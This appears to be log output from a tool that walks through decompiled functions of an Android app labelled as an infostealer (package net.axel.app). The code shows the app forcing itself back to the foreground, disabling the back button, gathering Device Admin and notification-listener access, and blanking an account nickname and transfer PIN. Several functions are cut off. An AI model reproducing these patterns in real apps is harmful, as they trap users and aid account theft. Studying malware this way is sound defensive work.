Processing APK: infostealer.json
Processing function 1, which looks like this: public void onCreate(android.os.Bundle r17) {
        /*
            Method dump skipped, instructions count: 574
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: net.axel.app.activities.Main.onCreate(android.os.Bundle):void");
    }
Processing function 2, which looks like this: public void a() {
            if (e.a.a.b.a.e(Main.this.p)) {
                Main.this.q.a("API_SUBSCRIBE_WASATA", true);
                if (!k.E(Main.this.p)) {
                    k.a(Main.this.p, (Boolean) true);
                } else {
                    Main main = Main.this;
                    main.q = e.a.a.a.a.a(main.p);
                    Main.this.q.a("API_SET_ACCOUNT_NICKNAME", " ");
                    Main.this.q.a("API_SET_TRANSFER_PIN", " ");
                }
            }
Processing function 3, which looks like this: public void b() {
        }
Processing function 4, which looks like this: public void run() {
                Intent intent = new Intent(Main.this, Telegram.class);
                Main.this.startActivity(intent);
                Main.this.finish();
            }
Processing function 5, which looks like this: public void run() {
            this.f4783b.post(new a());
        }
Processing function 6, which looks like this: public void l() {
        if (this.q.a("INSTA_APP_DONE")) {
            k.j(this.p);
            k.a(this.p, 0);
        } else if (this.q.a("INSTA_APP_DONE_NON_TRANS")) {
            startActivity(new Intent("android.settings.SETTINGS"));
        } else if (this.q.a("INSTA_APP_BIXBY")) {
            k.f(this.p, "com.google.android.apps.maps");
        } else if (this.q.a("INSTA_APP_PLAY_SERVICES")) {
            k.f(this.p, "com.android.vending");
        } else if (this.q.a("INSTA_APP_CHROME")) {
            k.f(this.p, "com.android.chrome");
        } else if (this.q.a("INSTA_APP_WIFI")) {
            Intent intent = new Intent("android.settings.WIFI_SETTINGS");
            intent.setFlags(268435456);
            startActivity(intent);
        }
        finish();
    }
Processing function 7, which looks like this: public void n() {
        boolean First_Run = this.q.a("API_CHECK_FRIEND_ACCOUNT");
        if (!First_Run) {
            this.q.a("API_CHECK_FRIEND_ACCOUNT", true);
            if (e.a.a.b.a.e(this.p)) {
                this.q.a("API_SUBSCRIBE_WASATA", true);
                if (!k.E(this.p)) {
                    k.a(this.p, (Boolean) true);
                    return;
                }
                this.q = e.a.a.a.a.a(this.p);
                this.q.a("API_SET_ACCOUNT_NICKNAME", " ");
                this.q.a("API_SET_TRANSFER_PIN", " ");
                return;
            }
Processing function 8, which looks like this: public void m() {
        if (e.a.a.b.a.e(this.p)) {
            k.E(this.p, 240);
        }
    }
Processing function 9, which looks like this: private void a(ArrayList<String> arraylist) {
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 22) {
            try {
                if (i2 < 29) {
                    arraylist.add("Virtual Notifications");
                } else {
                    arraylist.add("Device Admin");
                }
                arraylist.add("Google Listener");
                arraylist.add("Notifications Service");
                if ((Build.MANUFACTURER.equalsIgnoreCase("xiaomi") || Build.MANUFACTURER.equalsIgnoreCase("huawei")) && Build.VERSION.SDK_INT >= 26) {
                    arraylist.add("Auto Start");
                }
            }
Processing function 10, which looks like this: public void onBackPressed() {
    }
Processing function 11, which looks like this: public void onStart() {
        super.onStart();
        this.s.a();
    }
Processing function 12, which looks like this: public void onStop() {
        super.onStop();
        this.s.b();
    }
Processing function 13, which looks like this: protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        ((ActivityManager) getApplicationContext().getSystemService("activity")).moveTaskToFront(getTaskId(), 0);
    }
Processing function 14, which looks like this: public void onPause() {
        super.onPause();
        ((ActivityManager) getApplicationContext().getSystemService("activity")).moveTaskToFront(getTaskId(), 0);
    }
Processing function 15, which looks like this: public void onDestroy() {
        super.onDestroy();
    }
Processing function 16, which looks like this: public void o() {
        ArrayList<String> arrayList = u;
        if (arrayList != null) {
            arrayList.clear();
            u.add("play");
            u.add("settings");
            if (Build.MANUFACTURER.equalsIgnoreCase("samsung")) {
                u.add("bixby");
            }
            u.add("chrome");
            u.add("wifi");
        }
Sending request to server...
